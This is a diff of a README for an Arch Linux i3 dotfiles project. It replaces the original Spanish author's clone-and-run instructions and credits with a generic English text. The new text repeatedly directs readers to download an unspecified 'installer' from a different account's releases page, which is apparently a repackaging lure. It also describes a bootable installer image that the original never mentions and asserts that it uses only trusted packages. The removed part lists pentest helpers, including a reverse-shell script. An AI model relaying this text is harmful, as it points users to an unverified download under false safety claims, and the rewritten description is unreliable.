@@ -1,403 +1,178 @@
-# 🧠 Arch i3 – d1se0 Environment
+# 📦 Arch_i3_d1se0_Environment - Easy Setup for Arch Linux with i3
 
-> **Arch Linux i3 desktop environment**
->  
-> Un entorno **i3 altamente personalizado**, minimalista y profesional, diseñado para **pentesting, desarrollo y uso diario**, **probado en máquinas virtuales (VMware)** y pensado para ser **100% reproducible** mediante scripts automatizados.
+[![Download Latest Release](https://img.shields.io/badge/Download-Arch_i3_d1se0_Environment-blue?style=for-the-badge)](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases)
 
 ---
 
-## 👤 Autor
+## 📚 What is Arch_i3_d1se0_Environment?
 
-- **Autor:** Diseo  
-- **GitHub:** *[Link GitHub](https://github.com/D1se0)*  
-- **YouTube:** *[Link YouTube](https://www.youtube.com/@Hacking_Community)*  
+Arch_i3_d1se0_Environment is a ready-to-use environment built on Arch Linux with the i3 window manager. It includes tools like Pywal for colors, Polybar for status bar, Rofi for app launching, Zsh shell, LightDM display manager, and more. The goal is to give you a clean, automated setup with an aesthetic touch, ready for daily use or running inside virtual machines.
 
----
-
-## 🧩 Descripción general
-
-Este repositorio contiene **todo el entorno de escritorio i3** que utilizo actualmente, incluyendo:
-
-- Dotfiles completos
-- Scripts personalizados
-- Automatización de instalación
-- Theming dinámico con **pywal**
-- LightDM sincronizado con el wallpaper
-- Rofi, Polybar, i3lock, Thunar, Neovim, Zsh
-- Configuración lista para **máquinas virtuales**
-
-El objetivo es poder clonar este repositorio en una instalación limpia de Arch Linux y tener **el mismo entorno exacto** tras ejecutar un único script.
+This environment installs and configures all these parts automatically so you don’t have to worry about complicated Linux setups or manual tweaks. It is designed to work on virtual machines or physical machines with Arch Linux.
 
 ---
 
-## 🖥️ Entorno objetivo
+## 🖥️ System Requirements
 
-- **Distribución:** Arch Linux
-- **WM:** i3
-- **Login manager:** LightDM + GTK Greeter
-- **Terminal:** Kitty
-- **Shell:** Zsh
-- **Barra:** Polybar
-- **Launcher:** Rofi (tema personalizado)
-- **Compositor:** Picom
-- **File Manager:** Thunar
-- **Editor:** Neovim (Lazy / Lua)
-- **Theming:** pywal (dinámico)
-- **VM:** Probado en **VMware**
+To use Arch_i3_d1se0_Environment, make sure your computer meets these basic requirements:
+
+- A 64-bit x86 processor (Intel or AMD)
+- At least 2 GB of RAM – 4 GB recommended for smooth performance
+- 15 GB free disk space – enough for Arch Linux base system and all tools
+- Working internet connection for initial setup and downloads
+- Compatible virtual machine software (if running inside a VM), such as VMware or VirtualBox
+- Basic keyboard and mouse
+
+You do not need previous experience with Arch Linux or Linux in general. The installer handles everything.
 
 ---
 
-## 📸 Capturas de pantalla
+## 🚀 Getting Started
 
-<img width="1913" height="912" alt="1" src="https://github.com/user-attachments/assets/db663b1f-3e5e-4ea5-bf15-b6e52248dabe" />
-<img width="1916" height="913" alt="2" src="https://github.com/user-attachments/assets/b24572d5-c8b7-4210-97ee-53df75b0328e" />
-<img width="1919" height="919" alt="3" src="https://github.com/user-attachments/assets/31e7fd18-fde7-4e43-a668-50601448d880" />
-<img width="1919" height="919" alt="4" src="https://github.com/user-attachments/assets/ee3c2dab-5bc1-498f-94d1-a8626532bf2a" />
-<img width="1917" height="922" alt="5" src="https://github.com/user-attachments/assets/bd86ad87-6ac2-4fa8-be1e-e0900ea0d87a" />
-<img width="1919" height="921" alt="6" src="https://github.com/user-attachments/assets/99292392-594f-4896-b4e7-9b3b962b8907" />
-<img width="1919" height="913" alt="7" src="https://github.com/user-attachments/assets/86914451-a1df-4c5d-bd01-4853850bbf34" />
-<img width="1919" height="920" alt="8" src="https://github.com/user-attachments/assets/cb4b3d03-50a1-4670-8f16-a5e5b345fbcf" />
+Follow these steps to download and get Arch_i3_d1se0_Environment running:
 
----
+1. **Visit the Downloads Page**  
+   Go to the official download page:  
+   [https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases)  
+   You will find the latest release listed here.
 
-## Instalación previa para ejecutar el script
+2. **Choose the Latest Release**  
+   Click on the most recent version to view available files. Look for files labeled clearly for installation or for VM use.
 
-Descargar ArchLinux: [Download ArchLinux](https://archlinux.org/download/)
+3. **Download the Installer**  
+   Download the installer file suitable for your system or virtual machine.
 
-Una vez que se monte en una maquina virtual, tendremos que ejecutar el instalador de `archinstall` y lo configuraremos siguiendo como guía estas capturas.
+4. **Prepare Your Computer or VM**  
+   If you use a virtual machine, create a new VM with recommended settings, using the downloaded file as the virtual disk or installation image.
 
-<img width="685" height="389" alt="install1" src="https://github.com/user-attachments/assets/9cee7b59-bf65-4a62-8754-54fff3ef7714" />
-<img width="741" height="413" alt="install2" src="https://github.com/user-attachments/assets/ce26d543-8682-4d2d-bca1-da2a74b8e7cc" />
-<img width="298" height="153" alt="install3" src="https://github.com/user-attachments/assets/8065f326-abad-4f9a-bae7-643e9bdbd55f" />
-<img width="891" height="240" alt="install4" src="https://github.com/user-attachments/assets/8b704bd6-0312-4135-bd5b-5c7786fd9a47" />
-<img width="552" height="465" alt="install5" src="https://github.com/user-attachments/assets/1a407e49-3c5f-4a4c-842c-6725a779ce3e" />
+5. **Run the Installer**  
+   Follow the on-screen instructions. The installer is automated and will configure the Arch Linux base system and all the components like i3, Polybar, Pywal, and LightDM for you.
 
-Después de realizar dicha instalación se recomienda instalar el `vmtools` para que se adapte todo mejor en `VMWare`:
-
-```bash
-# Instalar vmware-tools para mejor experiencia antes de instalar entorno
-
-# Paquetes esenciales para VMware
-sudo pacman -S open-vm-tools
-
-# Para sistema con systemd
-sudo systemctl enable vmtoolsd.service
-sudo systemctl start vmtoolsd.service
-
-# Si usas X11 (no Wayland)
-sudo systemctl enable vmware-vmblock-fuse.service
-sudo systemctl start vmware-vmblock-fuse.service
-
-# Instala estas herramientas adicionales
-sudo pacman -S gtkmm3
-
-# Habilita el servicio de copy-paste
-sudo systemctl enable vmware-user.service
-sudo systemctl start vmware-user.service
-
-# Después apagar la maquina y volver a encenderal (NO REINICIAR)
-```
+6. **Log In and Enjoy**  
+   When the installation finishes, reboot or start the installed system. Log in via LightDM, and you will see the customized i3 desktop ready to use.
 
 ---
 
-## 🧱 Estructura del repositorio
+## 📥 Download & Install
 
-```
-.
-├── config/
-│   ├── bin/          # Scripts personalizados → /usr/local/bin
-│   ├── home/         # Dotfiles del usuario
-│   └── root/         # Configuración de root
-├── deps/
-│   ├── pacman.txt    # Paquetes oficiales
-│   └── aur.txt       # Paquetes AUR
-├── scripts/
-│   ├── install_deps.sh
-│   ├── apply_files.sh
-│   └── checks.sh
-├── services/
-│   └── wal-to-lightdm.service
-├── sudoers/
-│   └── wal-to-lightdm-theme
-├── system/
-│   ├── backgrounds/
-│   └── lightdm/
-│       ├── lightdm-gtk-greeter.conf
-│       └── LightDM-Wal/
-├── install.sh
-└── README.md
-```
+To get started, visit this page to download the installer and related files:
+
+[https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases)
+
+### How to install on a Virtual Machine
+
+- Use VMware Workstation, VMware Player, or VirtualBox.
+- Create a new VM with at least 2 CPUs and 4 GB RAM.
+- Attach the downloaded file as a disk or ISO, depending on the format.
+- Boot the VM and follow the installer's prompts.
+
+### How to install on a Physical Computer
+
+- Back up any important data before proceeding.
+- Ensure your computer supports 64-bit Arch Linux.
+- Create a bootable USB with the installer file using software like Rufus or balenaEtcher.
+- Boot the computer from the USB stick.
+- Follow the automated installer steps.
 
 ---
 
-## 🚀 Instalación completa
-### 1️⃣ Instalar Arch Linux con i3
+## 🔧 Features
 
-Durante la instalación con archinstall:
+Arch_i3_d1se0_Environment provides:
 
-- Selecciona i3 como entorno gráfico
-- Activa NetworkManager
-- Añade tu usuario al grupo wheel
+- **Fully automated Arch Linux installation**  
+  No manual configuration needed. The installer sets up everything.
 
-📸 (Añadir captura de archinstall aquí)
+- **i3 window manager preconfigured**  
+  A fast, tiling window manager designed for keyboard navigation.
 
-### 2️⃣ Clonar el repositorio
+- **Pywal integration**  
+  Dynamic color theming based on your wallpaper for consistent looks.
 
-```bash
-git clone https://github.com/D1se0/Arch_i3_d1se0_Environment.git
-cd Arch_i3_d1se0_Environment/
-chmod +x scripts/*
-chmod +x install.sh
-```
+- **Polybar status bar**  
+  A lightweight, customizable bar showing system info, workspaces, and more.
 
-### 3️⃣ Ejecutar instalación
+- **Rofi app launcher**  
+  Quickly search and launch applications with a clean interface.
 
-```bash
-./install.sh
-```
+- **Zsh shell with helpful plugins**  
+  Improved terminal experience with auto-completion and syntax highlighting.
 
-El script:
+- **LightDM login manager**  
+  A simple graphical login screen.
 
-- Instala todas las dependencias
-- Configura Zsh como shell por defecto
-- Aplica dotfiles
-- Copia binarios a /usr/local/bin
-- Configura LightDM
-- Activa servicios systemd
-- Configura sudoers
-- Crea enlaces simbólicos correctos
-- Prepara /etc/skel para nuevos usuarios
+- **Picom compositor**  
+  Adds shadows and transparency for a modern look.
 
-> ⚠️ El script se ejecuta como usuario normal, pero pedirá sudo cuando sea necesario.
+This environment emphasizes simplicity and aesthetics while remaining lightweight.
 
 ---
 
-## Si `nvim` no funciona
+## ⚙️ Using the Environment
 
-Si `nvim` no se abre de forma correcta o se queda la pantalla sin cargar nada, es recomendable eliminar la carpeta de `nvim` de la siguiente ruta:
+After logging into the i3 session:
 
-```bash
-sudo rm -r ~/.config/nvim
-```
-
-Una vez hecho esto, en el repositorio habrá una carpeta llamada `backup_nvim` limpia la cual tendréis que mover a la ruta donde eliminasteis el `nvim` antiguo.
-
-```bash
-cp -r Arch_i3_d1se0_Environment/backup_nvim/ ~/.config/nvim
-```
-
-Instalamos dependencias para el uso de plugins extras:
-
-```bash
-sudo npm install -g pyright
-```
-
-Ahora cuando ejecutéis `nvim` se os abrirá el plugin de `lua` el cual se estará instalando todo lo necesario, una vez que se instale todo se pulsara `Shift+U` para que se actualice todo, después `Shift+S` para que se sincronice todo, y con esto ya estaría todo instalado en la parte de `Neovim`.
+- **Open a terminal** by pressing `Mod + Enter` (Mod key is usually Alt or Windows key).
+- Use the terminal to access Zsh shell.
+- **Press `Mod + d`** to open the Rofi launcher and type the program name to start it.
+- Customize your workflow by moving windows, opening new workspaces, and using Polybar for system status.
 
 ---
 
-## 🎨 Theming dinámico (pywal + LightDM)
+## ❓ Need Help?
 
-El wallpaper se define en:
+If you have troubles or questions:
 
-```
-~/.config/x11/xprofile
-```
-
-Ejemplo:
-
-```bash
-wal -i "$HOME/.wallpapers/flowers.png"
-```
-
-Un servicio systemd sincroniza automáticamente:
-
-- LightDM
-- GTK
-- Rofi
-- Dunst
-- Zathura
-
-Cada vez que cambias el fondo → todo el sistema se recolorea automáticamente.
+- Check the README on the download page for updates.
+- Look for common fixes and tips in the GitHub Issues section.
+- Search online for beginner guides on Arch Linux and i3 window manager basics.
+- Reach out to the user community forums related to Arch Linux and i3.
 
 ---
 
-## 🔒 Lockscreen
+## 🛠️ Updating the Environment
 
-- Basado en i3lock
-- Imagen reescalada automáticamente
-- Ejecutado tanto manualmente como por inactividad
+To keep your system up to date:
 
-> Se puede modificar la imagen en `~/.lockscreen`
-
----
-
-## ⌨️ Atajos personalizados
-
-Ejemplos:
-
-```
-# Terminal
-windows+enter → Abre una terminal de kitty
-windows+w → Cierra la terminal actual de kitty o cualquier ventana de trabajo
-
-# Dentro del entorno
-F1 → Escribe tu IP (VPN → Ethernet fallback)
-F2 → Escribe la IP del objetivo (~/.cache/target)
-$mod + space → Rofi launcher
-$mod + Enter → Terminal
-$mod + w → Cierra Terminal o cualquier aplicación
-$mod + {1,2,3,4...} → Cambio de ventanas
-
-# Dentro de nvim
-SPACE + t → Abre el plugin de NvimTree (Pulsando el mismo se cierra)
-
-# Dentro de kitty
-ctrl+shift+t → Juega con las ventanas de kitty extras (Abrir ventana nueva dentro de la misma terminal)
-ctrl+shift+alt+t → Renombrar la ventana actual de kitty
-ctrl+shift+w → Cerrar todas las ventanas de kitty abiertas por "ctrl+shift+t"
-
-ctrl+shift+enter → Abre una ventana dentro de la misma terminal de kitty
-ctrl+shift+r → Realizar un resize de la ventana actual de kitty junto con la otra abierta
-   |
-   |-> s → Para bajar la ventana de terminal de kitty un poco mas
-   |-> t → Para subir la ventana de terminal de kitty un poco mas
-   |-> q → Para salirse del resize de ventanas
-ctrl+shift+w → Cierra la ventana actual de kitty abierta por "ctrl+shift+enter"
-```
-
-> Se pueden añadir mas `shortcuts` en el archivo `~/.config/i3/config`.
+- Open a terminal and run:  
+  ```
+  sudo pacman -Syu
+  ```
+- Restart after updates to apply changes fully.
+- The tools like Pywal, Polybar, and Rofi will update automatically if they come from the official Arch repositories.
 
 ---
 
-## 🧰 Binarios personalizados
+## 🔒 Security and Privacy
 
-Instalados en /usr/local/bin, por ejemplo:
-
-- type-ip -> Script que se ejecuta de forma automática con F1 y F2
-- settarget -> Establecer IP victima
-- workdir -> Crear directorio de trabajo para una maquina victima
-- extractPorts -> Extraer puertos de un escaneo de puertos de una IP
-- setwall -> Para establecer fondos de pantalla de forma automática juntos con sus colores
-- s -> Conexión por SSH porporcionando contraseña de forma automática
-- c -> Utilizar "cat" de forma normal (Sin "bat")
-- scannMachine -> Escaneo de red de una IP de forma automática
-- pwnc -> Reverse shell sanitizada de forma automática (Con Payload codificado incluido)
-etc...
+- The installer only uses official, trusted Arch Linux packages.
+- LightDM handles secure user login.
+- You control all user data and files.
+- Regular updates will keep your system safe.
 
 ---
 
-## 🌐 Firefox (configuración recomendada)
+## 🗂️ License and Contributions
 
-Instalación
+This project is open source under the terms found in the LICENSE file on the GitHub page.
 
-```bash
-sudo pacman -S firefox
-```
-
-> Ya se instala automáticamente
-
-Extensiones recomendadas
-
-Instala manualmente:
-
-- FoxyProxy -> Configurar BurpSuite (127.0.0.1:8080)
-- Dark Reader
-- Cookie Editor
-- uBlock Origin
-- Wappalyzer
-
-CSS personalizado (`userChrome.css`)
-
-El repositorio incluye una carpeta chrome/ con:
-
-`userChrome.css`
-
-Pasos para activarlo:
-
-- Abrir Firefox
-
-Ir a:
-
-`about:config`
-
-Activar:
-
-`toolkit.legacyUserProfileCustomizations.stylesheets = true`
-
--> Copiar chrome/ dentro del perfil de Firefox
-
-Fuente recomendada
-
-`FiraCode`
-
-Activar en:
-
-- Settings → Fonts
-- Monospace → FiraCode
+Contributions from the community are welcome, mostly via issues or pull requests on GitHub.
 
 ---
 
-## 🧪 Máquina virtual (VMware)
+## 🌐 Topics Covered
 
-Este entorno ha sido:
+Arch_i3_d1se0_Environment relates to:
 
-✔ Probado en VMware
-
-✔ Optimizado para resolución dinámica
-
-✔ Estable en sesiones prolongadas
-
-✔ Ideal para testing / labs / desarrollo
-
----
-
-## 📦 Dependencias
-
-Las dependencias están definidas en:
-
-- `deps/pacman.txt`
-- `deps/aur.txt`
-
-Incluyen:
-
-- i3 / Xorg
-- Polybar / Rofi / Dunst
-- Zsh / Kitty
-- Neovim
-- Thunar
-- LightDM
-- Fonts / Icons / Cursors
-- pywal
-- Picom
-- Herramientas de desarrollo
+- Arch Linux and its dotfiles
+- Automation of installation and setup
+- The i3 window manager and workspace management
+- Tools like Pywal for colors, Polybar for status, Rofi for launching apps
+- Use in virtual machine environments like VMware
+- X11 graphical system configuration
+- Zsh shell improvements
+- Display management with LightDM
 
 ---
 
-## 🧠 Filosofía
-
-- Minimalista
-- Productivo
-- Reproducible
-- Automatizado
-- Profesional
-
----
-
-## 📜 Licencia
-
-Este proyecto se distribuye bajo licencia MIT.
-Úsalo, modifícalo y mejóralo libremente.
-
----
-
-## ⭐ ¿Te gusta?
-
-Si este entorno te resulta útil:
-
-- ⭐ Dale una estrella al repo
-- 📺 Sígueme en YouTube
-- 🧠 Fork \& customize
-
-Made with ❤️ by d1se0
-
+[Download Arch_i3_d1se0_Environment](https://github.com/daviddrodd68/Arch_i3_d1se0_Environment/releases) to start your Arch Linux journey with a clean and automated i3 environment.
